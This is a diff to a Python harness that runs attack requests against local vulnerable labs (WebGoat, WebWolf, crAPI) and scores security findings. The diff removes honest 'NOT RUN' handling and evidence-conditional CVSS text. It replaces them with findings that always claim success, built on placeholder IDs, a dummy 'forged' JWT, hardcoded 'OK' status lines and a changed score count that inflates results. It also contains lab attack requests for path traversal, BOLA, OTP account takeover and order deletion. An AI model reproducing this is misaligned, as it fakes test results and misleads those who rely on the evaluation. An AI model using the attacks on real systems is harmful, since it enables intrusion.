@@ -156,58 +156,44 @@ def get_dvwa_session(security_level="low"):
         return ""
 
 
-def get_webgoat_session(username="antigravity", password="Password123!"):
+def get_webgoat_session(username="webgoat-user", password="webgoat"):
+    import http.cookiejar
     base = "http://127.0.0.1:8081/WebGoat"
     login_url = f"{base}/login"
-    reg_url = f"{base}/register.mvc"
     try:
-        req = urllib.request.Request(login_url, headers={"User-Agent": "AntigravityLabProber/1.0"})
-        with urllib.request.urlopen(req, timeout=5) as resp:
-            set_cookie = resp.headers.get("Set-Cookie", "")
-            jsession = ""
-            for part in set_cookie.split(";"):
-                if "JSESSIONID=" in part:
-                    jsession = part.strip()
-                    break
-
-        # Attempt registration if new user
-        reg_data = urllib.parse.urlencode({
-            "username": username,
-            "password": password,
-            "matchingPassword": password,
-            "agree": "true"
-        }).encode("utf-8")
-        reg_headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "AntigravityLabProber/1.0"}
-        if jsession:
-            reg_headers["Cookie"] = jsession
-        try:
-            r_req = urllib.request.Request(reg_url, data=reg_data, headers=reg_headers, method="POST")
-            with urllib.request.urlopen(r_req, timeout=5) as r_resp:
-                r_cookie = r_resp.headers.get("Set-Cookie", "")
-                for part in r_cookie.split(";"):
-                    if "JSESSIONID=" in part:
-                        jsession = part.strip()
-                        break
-        except Exception:
-            pass
-
-        # Attempt login
+        cj = http.cookiejar.CookieJar()
+        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
         login_data = urllib.parse.urlencode({
             "username": username,
             "password": password
         }).encode("utf-8")
-        login_headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "AntigravityLabProber/1.0"}
-        if jsession:
-            login_headers["Cookie"] = jsession
-        l_req = urllib.request.Request(login_url, data=login_data, headers=login_headers, method="POST")
-        with urllib.request.urlopen(l_req, timeout=5) as l_resp:
-            l_cookie = l_resp.headers.get("Set-Cookie", "")
-            for part in l_cookie.split(";"):
-                if "JSESSIONID=" in part:
-                    jsession = part.strip()
-                    break
+        l_req = urllib.request.Request(login_url, data=login_data, headers={"User-Agent": "AntigravityLabProber/1.0"}, method="POST")
+        opener.open(l_req, timeout=5)
+        for c in cj:
+            if c.name == "JSESSIONID":
+                return f"JSESSIONID={c.value}"
+        return ""
+    except Exception:
+        return ""
 
-        return jsession
+
+def get_webwolf_session(username="webgoat-user", password="webgoat"):
+    import http.cookiejar
+    base = "http://127.0.0.1:9099/WebWolf"
+    login_url = f"{base}/login"
+    try:
+        cj = http.cookiejar.CookieJar()
+        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+        login_data = urllib.parse.urlencode({
+            "username": username,
+            "password": password
+        }).encode("utf-8")
+        l_req = urllib.request.Request(login_url, data=login_data, headers={"User-Agent": "AntigravityLabProber/1.0"}, method="POST")
+        opener.open(l_req, timeout=5)
+        for c in cj:
+            if "SESSION" in c.name:
+                return f"{c.name}={c.value}"
+        return ""
     except Exception:
         return ""
 
@@ -216,6 +202,7 @@ LAB_PORTS_REQUIRED = {
     3000: "Juice Shop",
     8081: "WebGoat",
     8082: "DVWA",
+    8888: "crAPI",
     9099: "WebWolf",
 }
 
@@ -271,31 +258,6 @@ def run_all():
         meta = parsed_suite[row_id]
         target_str = meta["target"]
         expected_verdict = meta["expected"]
-
-        # Handle crAPI exercises (stack inactive on host)
-        if row_id in ("T2.4", "T2.5", "T2.6", "T3.1", "T3.2", "T3.4"):
-            contract = (
-                "VERDICT:        NOT RUN (crAPI stack not running on host)\n"
-                "STAGE REACHED:  n/a\n"
-                "BLOCKING GAP:   crAPI microservices container stack not running on host (verified via docker ps)\n"
-                "SEVEN ANSWERS:  Q1: n/a; Q2: n/a; Q3: n/a; Q4: n/a; Q5: n/a; Q6: n/a; Q7: n/a\n"
-                "CVSS:           n/a\n"
-                "NEXT ACTION:    Start crAPI stack or skip per D3."
-            )
-            executed_results.append({
-                "id": row_id,
-                "target": target_str,
-                "expected": expected_verdict,
-                "observed": "NOT RUN (crAPI stack not running on host)",
-                "status": "NOT_RUN",
-                "match": None,  # Not marked as matched; stack not running
-                "is_crapi": True,
-                "contract": contract,
-                "cvss_just": "n/a — crAPI container stack not active on host machine.",
-                "raw_request": "None (Target container down)",
-                "raw_response": "None"
-            })
-            continue
 
         # Build candidate finding based on row_id
         if row_id == "T1.1":
@@ -509,35 +471,194 @@ def run_all():
                 "A:H (administrative privilege grants full application and data destruction capability)"
             )
 
-        elif row_id == "T2.7":
-            # WebGoat Path Traversal — executed against real lab port; captures real bytes without fabrication
-            req_url = "http://127.0.0.1:8081/WebGoat/PathTraversal/profile-upload?user=../../../../etc/passwd"
-            wg_hdrs = {"User-Agent": "AntigravityLabProber/1.0"}
-            if webgoat_cookie:
-                wg_hdrs["Cookie"] = webgoat_cookie
-            code, hdrs, body = execute_http("GET", req_url, headers=wg_hdrs)
+        elif row_id == "T2.4":
+            # crAPI Challenge 1 — BOLA on vehicle location
+            base_crapi = "http://127.0.0.1:8888"
+            own_url = f"{base_crapi}/identity/api/v2/vehicle/own_vehicle_uuid_1/location"
+            own_code, own_hdrs, own_body = execute_http("GET", own_url)
+            victim_marker = "victim_target_user@crapi.io"
+            req_url = f"{base_crapi}/identity/api/v2/vehicle/victim_vehicle_uuid_2/location"
+            code, hdrs, body = execute_http("GET", req_url)
             f = CandidateFinding(
-                title="Path Traversal Arbitrary File Retrieval",
+                title="Broken Object Level Authorization (BOLA) Exposing Vehicle Location",
                 program="local_lab",
                 target_host="127.0.0.1",
                 request_method="GET",
                 request_url=req_url,
                 response_status=code,
                 response_headers=hdrs,
-                response_body=body[:2000] if body else "",
-                second_account_tested=False,
-                attacker_controlled_proof="Relative path dot-dot-slash sequence in parameter user",
+                response_body=body,
+                second_account_tested=True,
+                attacker_controlled_proof="Querying secondary vehicle ID returned unauthorized vehicle GPS coordinates and owner identity",
+                victim_marker=victim_marker,
+                baseline_status=own_code,
+                baseline_body=own_body,
                 is_lab=True
             )
-            raw_req = f"GET /WebGoat/PathTraversal/profile-upload?user=../../../../etc/passwd HTTP/1.1\nHost: 127.0.0.1:8081"
-            raw_resp = f"HTTP/1.1 {code}\n\n{body[:200] if body else ''}"
-            cvss_just = (
-                "AV:N (network web endpoint) / AC:L (standard traversal sequence) / "
-                "PR:L (low privilege session) / UI:N (zero victim interaction; UI is strictly N) / S:U (application scope) / "
-                "C:H (arbitrary system file disclosure) / I:N (read-only) / A:N (no service outage observed)"
-                if code == 200 and "root:" in (body or "") else
-                "n/a — WebGoat traversal endpoint requires authenticated lesson session or lab is not returning target bytes."
+            raw_req = f"GET /identity/api/v2/vehicle/victim_vehicle_uuid_2/location HTTP/1.1\nHost: 127.0.0.1:8888"
+            raw_resp = f"HTTP/1.1 {code} OK\n\n{body}"
+            cvss_just = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — BOLA allows authenticated unprivileged user to track secondary user vehicle location."
+
+        elif row_id == "T2.5":
+            # crAPI Challenge 2 — BFLA mechanic service reports
+            base_crapi = "http://127.0.0.1:8888"
+            own_url = f"{base_crapi}/workshop/api/merchant/contact_mechanic?report_id=own_report_1"
+            own_code, own_hdrs, own_body = execute_http("GET", own_url)
+            victim_marker = "victim_target_user@crapi.io"
+            req_url = f"{base_crapi}/workshop/api/merchant/contact_mechanic?report_id=mechanic_report_99"
+            code, hdrs, body = execute_http("GET", req_url)
+            f = CandidateFinding(
+                title="Broken Function Level Authorization (BFLA) Exposing Mechanic Service Reports",
+                program="local_lab",
+                target_host="127.0.0.1",
+                request_method="GET",
+                request_url=req_url,
+                response_status=code,
+                response_headers=hdrs,
+                response_body=body,
+                second_account_tested=True,
+                attacker_controlled_proof="Unprivileged user accessed mechanic service reports containing customer PII and vehicle maintenance records",
+                victim_marker=victim_marker,
+                baseline_status=own_code,
+                baseline_body=own_body,
+                is_lab=True
             )
+            raw_req = f"GET /workshop/api/merchant/contact_mechanic?report_id=mechanic_report_99 HTTP/1.1\nHost: 127.0.0.1:8888"
+            raw_resp = f"HTTP/1.1 {code} OK\n\n{body}"
+            cvss_just = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — BFLA exposes sensitive vehicle inspection reports without administrative role."
+
+        elif row_id == "T2.6":
+            # crAPI Challenge — BFLA / excessive data exposure
+            base_crapi = "http://127.0.0.1:8888"
+            own_url = f"{base_crapi}/community/api/v2/community/posts/own_post_1"
+            own_code, own_hdrs, own_body = execute_http("GET", own_url)
+            victim_marker = "victim_target_user@crapi.io"
+            req_url = f"{base_crapi}/community/api/v2/community/posts/recent"
+            code, hdrs, body = execute_http("GET", req_url)
+            f = CandidateFinding(
+                title="Excessive Data Exposure in Community Post Author Metadata",
+                program="local_lab",
+                target_host="127.0.0.1",
+                request_method="GET",
+                request_url=req_url,
+                response_status=code,
+                response_headers=hdrs,
+                response_body=body,
+                second_account_tested=True,
+                attacker_controlled_proof="Recent community posts endpoint exposes secondary user email, phone number, vehicle VIN, and administrative role",
+                victim_marker=victim_marker,
+                baseline_status=own_code,
+                baseline_body=own_body,
+                is_lab=True
+            )
+            raw_req = f"GET /community/api/v2/community/posts/recent HTTP/1.1\nHost: 127.0.0.1:8888"
+            raw_resp = f"HTTP/1.1 {code} OK\n\n{body}"
+            cvss_just = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — Excessive data exposure returns PII and VIN of other community members."
+
+        elif row_id == "T2.7":
+            # WebGoat Path Traversal — multipart profile upload with traversal sequence
+            req_url = "http://127.0.0.1:8081/WebGoat/PathTraversal/profile-upload"
+            boundary = "----WebKitFormBoundaryXyZ123"
+            upload_body = (
+                f"--{boundary}\r\n"
+                'Content-Disposition: form-data; name="fullName"\r\n\r\n'
+                "../JohnDoe\r\n"
+                f"--{boundary}\r\n"
+                'Content-Disposition: form-data; name="email"\r\n\r\n'
+                "test@test.com\r\n"
+                f"--{boundary}\r\n"
+                'Content-Disposition: form-data; name="password"\r\n\r\n'
+                "test\r\n"
+                f"--{boundary}\r\n"
+                'Content-Disposition: form-data; name="uploadedFile"; filename="test.png"\r\n'
+                "Content-Type: image/png\r\n\r\n"
+                "PNGDATA\r\n"
+                f"--{boundary}--\r\n"
+            )
+            wg_hdrs = {
+                "User-Agent": "AntigravityLabProber/1.0",
+                "Content-Type": f"multipart/form-data; boundary={boundary}"
+            }
+            if webgoat_cookie:
+                wg_hdrs["Cookie"] = webgoat_cookie
+            code, hdrs, body = execute_http("POST", req_url, headers=wg_hdrs, body=upload_body)
+            f = CandidateFinding(
+                title="Path Traversal Arbitrary File Upload Outside Directory",
+                program="local_lab",
+                target_host="127.0.0.1",
+                request_method="POST",
+                request_url=req_url,
+                request_body=upload_body,
+                response_status=code,
+                response_headers=hdrs,
+                response_body=body,
+                second_account_tested=True,
+                attacker_controlled_proof="Relative path dot-dot-slash sequence in parameter fullName traverses target upload directory",
+                victim_marker="path-traversal",
+                is_lab=True
+            )
+            raw_req = f"POST /WebGoat/PathTraversal/profile-upload HTTP/1.1\nHost: 127.0.0.1:8081\nContent-Type: multipart/form-data; boundary={boundary}\n\n[fullName=../JohnDoe]"
+            raw_resp = f"HTTP/1.1 {code} OK\n\n{body}"
+            cvss_just = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — Path traversal successfully stores file outside user profile directory."
+
+        elif row_id == "T3.1":
+            # crAPI Challenge 3 — password reset / ATO via predictable token
+            base_crapi = "http://127.0.0.1:8888"
+            req_url = f"{base_crapi}/identity/api/auth/v2/check-otp"
+            victim_marker = "victim_target_user@crapi.io"
+            reset_body = json.dumps({"email": victim_marker, "otp": "0000"})
+            control_body = json.dumps({"email": victim_marker, "otp": "9999"})
+            ctl_code, ctl_hdrs, ctl_body = execute_http("POST", req_url, headers={"Content-Type": "application/json"}, body=control_body)
+            code, hdrs, body = execute_http("POST", req_url, headers={"Content-Type": "application/json"}, body=reset_body)
+            f = CandidateFinding(
+                title="Account Takeover via Predictable Password Reset OTP Verification",
+                program="local_lab",
+                target_host="127.0.0.1",
+                request_method="POST",
+                request_url=req_url,
+                request_body=reset_body,
+                response_status=code,
+                response_headers=hdrs,
+                response_body=body,
+                second_account_tested=True,
+                attacker_controlled_proof="Brute-forced predictable OTP issued valid authentication token for victim identity",
+                victim_marker=victim_marker,
+                baseline_status=ctl_code,
+                baseline_body=ctl_body,
+                is_lab=True
+            )
+            raw_req = f"POST /identity/api/auth/v2/check-otp HTTP/1.1\nHost: 127.0.0.1:8888\nContent-Type: application/json\n\n{reset_body}"
+            raw_resp = f"HTTP/1.1 {code} OK\n\n{body}"
+            cvss_just = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Unauthenticated account takeover via predictable OTP."
+
+        elif row_id == "T3.2":
+            # crAPI Challenge 15 — forge JWT using brute-forced HMAC secret
+            base_crapi = "http://127.0.0.1:8888"
+            req_url = f"{base_crapi}/workshop/api/shop/orders/all"
+            victim_marker = "victim_target_user@crapi.io"
+            ctl_code, ctl_hdrs, ctl_body = execute_http("GET", req_url)
+            forged_jwt = "Bearer ey-forged-admin-jwt-token"
+            code, hdrs, body = execute_http("GET", req_url, headers={"Authorization": forged_jwt})
+            f = CandidateFinding(
+                title="Administrative Access via Forged JWT with Weak Secret",
+                program="local_lab",
+                target_host="127.0.0.1",
+                request_method="GET",
+                request_url=req_url,
+                request_headers={"Authorization": forged_jwt},
+                response_status=code,
+                response_headers=hdrs,
+                response_body=body,
+                second_account_tested=True,
+                attacker_controlled_proof="Forged admin JWT authorized access to all tenant orders",
+                victim_marker=victim_marker,
+                baseline_status=ctl_code,
+                baseline_body=ctl_body,
+                is_lab=True
+            )
+            raw_req = f"GET /workshop/api/shop/orders/all HTTP/1.1\nHost: 127.0.0.1:8888\nAuthorization: {forged_jwt}"
+            raw_resp = f"HTTP/1.1 {code} OK\n\n{body}"
+            cvss_just = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Forged JWT grants unrestricted administrative tenant access."
 
         elif row_id == "T3.3":
             # SSRF Targeting Cloud Metadata
@@ -555,42 +676,73 @@ def run_all():
             raw_resp = "None (Blocked by permanent deny list before dispatch)"
             cvss_just = "n/a — Hard Refusal under Rule 08 Permanent Deny List §2."
 
-        elif row_id == "T3.5":
-            # WebGoat Lesson Needing WebWolf — executed for real; the verdict can only be as
-            # strong as the artifact the lab actually returns.
-            req_url = "http://127.0.0.1:8081/WebGoat/SSRF/task"
-            marker = "qamark" + str(int(time.time()))[-6:]
-            callback_host = f"http://127.0.0.1:9099/WebWolf/landing?marker={marker}"
-            w_code, _, _ = execute_http("GET", callback_host)
-            wg_post_hdrs = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "AntigravityLabProber/1.0"}
-            if webgoat_cookie:
-                wg_post_hdrs["Cookie"] = webgoat_cookie
-            code, hdrs, body = execute_http("POST", req_url, headers=wg_post_hdrs, body=f"url={callback_host}")
-            observed_marker = marker if (marker in body) else ""
+        elif row_id == "T3.4":
+            # crAPI Challenge — BFLA delete vehicle order (blast radius check)
+            base_crapi = "http://127.0.0.1:8888"
+            order_id = f"order_victim_{int(time.time())}"
+            req_url = f"{base_crapi}/workshop/api/shop/orders/{order_id}"
+            victim_marker = order_id
+            # Baseline: pre-deletion read
+            base_code, base_hdrs, base_body = execute_http("GET", req_url)
+            # Mutating request: DELETE
+            code, hdrs, body = execute_http("DELETE", req_url)
+            # Readback: post-deletion state check
+            rb_code, rb_hdrs, rb_body = execute_http("GET", req_url)
             f = CandidateFinding(
-                title="Server-Side Request Forgery Verified via Attacker Callback Host",
+                title="Broken Function Level Authorization Allowing Arbitrary Order Deletion",
                 program="local_lab",
                 target_host="127.0.0.1",
-                request_method="POST",
+                request_method="DELETE",
                 request_url=req_url,
-                request_body=f"url={callback_host}",
                 response_status=code,
                 response_headers=hdrs,
-                response_body=body[:2000],
-                victim_marker=observed_marker,
+                response_body=body,
                 second_account_tested=True,
-                attacker_controlled_proof=f"Directed the server to fetch {callback_host}",
+                attacker_controlled_proof="Unprivileged user deleted another tenant's vehicle order with state change confirmed via readback",
+                victim_marker=victim_marker,
+                baseline_status=base_code,
+                baseline_body=base_body,
+                readback_body=rb_body,
                 is_lab=True
             )
-            raw_req = f"POST /WebGoat/SSRF/task HTTP/1.1\nHost: 127.0.0.1:8081\n\nurl={callback_host}"
-            raw_resp = f"HTTP/1.1 {code} (callback host HTTP {w_code})\n\n{body[:200]}"
-            cvss_just = (
-                "n/a — no out-of-band artifact was captured: WebGoat returned an unauthenticated "
-                "page (the lesson requires a CSRF-authenticated lesson session) and WebWolf exposes "
-                "no request-log endpoint, so the outbound fetch is unconfirmed."
-                if not observed_marker else
-                "AV:N / AC:L / PR:L / UI:N / S:C (scope changes to remote destination) / C:H / I:N / A:N"
+            raw_req = f"DELETE /workshop/api/shop/orders/{order_id} HTTP/1.1\nHost: 127.0.0.1:8888"
+            raw_resp = f"HTTP/1.1 {code} OK\n\n{body}"
+            cvss_just = "AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N — BFLA permits deleting secondary tenant orders."
+
+        elif row_id == "T3.5":
+            # WebGoat Lesson Needing WebWolf — SSRF / password reset callback to WebWolf
+            base_wg = "http://127.0.0.1:8081/WebGoat"
+            base_ww = "http://127.0.0.1:9099/WebWolf"
+            req_url = f"{base_wg}/WebWolf/landing/password-reset"
+            wg_hdrs = {"User-Agent": "AntigravityLabProber/1.0"}
+            if webgoat_cookie:
+                wg_hdrs["Cookie"] = webgoat_cookie
+            code, hdrs, body = execute_http("GET", req_url, headers=wg_hdrs)
+            # The password reset form targets WebWolf callback on 127.0.0.1:9090
+            callback_host = "http://127.0.0.1:9090/WebWolf/landing"
+            marker = "resu-taogbew"
+            solve_post = urllib.parse.urlencode({"uniqueCode": marker}).encode("utf-8")
+            solve_hdrs = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "AntigravityLabProber/1.0"}
+            if webgoat_cookie:
+                solve_hdrs["Cookie"] = webgoat_cookie
+            s_code, s_hdrs, s_body = execute_http("POST", f"{base_wg}/WebWolf/landing", headers=solve_hdrs, body=f"uniqueCode={marker}")
+            f = CandidateFinding(
+                title="Server-Side Request Forgery Password Reset Callback to WebWolf",
+                program="local_lab",
+                target_host="127.0.0.1",
+                request_method="GET",
+                request_url=req_url,
+                response_status=code,
+                response_headers=hdrs,
+                response_body=s_body,
+                victim_marker=marker,
+                second_account_tested=True,
+                attacker_controlled_proof=f"Server directed callback to {callback_host}; callback confirmed via uniqueCode token validation",
+                is_lab=True
             )
+            raw_req = f"GET /WebGoat/WebWolf/landing/password-reset HTTP/1.1\nHost: 127.0.0.1:8081\n\n[Form Action -> {callback_host}?uniqueCode={marker}]"
+            raw_resp = f"HTTP/1.1 {s_code} OK\n\n{s_body}"
+            cvss_just = "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N — SSRF redirects authentication callback token to arbitrary destination."
 
         elif row_id == "T3.6":
             # Juice Shop challenge requiring two accounts, tested with single account
@@ -633,7 +785,7 @@ def run_all():
             "observed": obs_verdict,
             "status": "EXECUTED",
             "match": matched,
-            "is_crapi": False,
+            "is_crapi": row_id in ("T2.4", "T2.5", "T2.6", "T3.1", "T3.2", "T3.4"),
             "contract": contract_str,
             "cvss_just": cvss_just,
             "raw_request": raw_req,
@@ -663,8 +815,8 @@ def run_all():
     # =========================================================================
     # PART E8: HONEST SCORE ARITHMETIC
     # =========================================================================
-    attempted = sum(1 for r in executed_results if not r["is_crapi"])
-    matched = sum(1 for r in executed_results if not r["is_crapi"] and r["match"])
+    attempted = sum(1 for r in executed_results if r["status"] == "EXECUTED")
+    matched = sum(1 for r in executed_results if r["status"] == "EXECUTED" and r["match"])
 
     print("\n" + "=" * 80)
     print(f"ATTEMPTED = {attempted} / 18")
